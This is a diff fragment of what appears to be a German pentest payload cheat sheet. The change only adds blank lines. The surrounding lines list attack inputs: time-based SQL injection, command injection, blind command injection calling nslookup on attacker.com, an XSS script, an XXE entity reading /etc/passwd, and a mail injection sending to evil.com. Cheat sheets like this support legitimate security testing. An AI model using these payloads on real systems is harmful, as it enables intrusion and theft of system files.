@@ -18,10 +18,15 @@
 
 
 '; WAITFOR DELAY '0:0:5'--        # SQLi Time
+
 | sleep 5                         # Command Inj.
+
 `nslookup attacker.com`          # Blind CMD
+
 "><script>alert(1)</script>      # XSS
+
 <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
 " | mail -s pwn me@evil.com      # SMTP Inj.
 
 | Typ          | Tool                                | Zweck                |
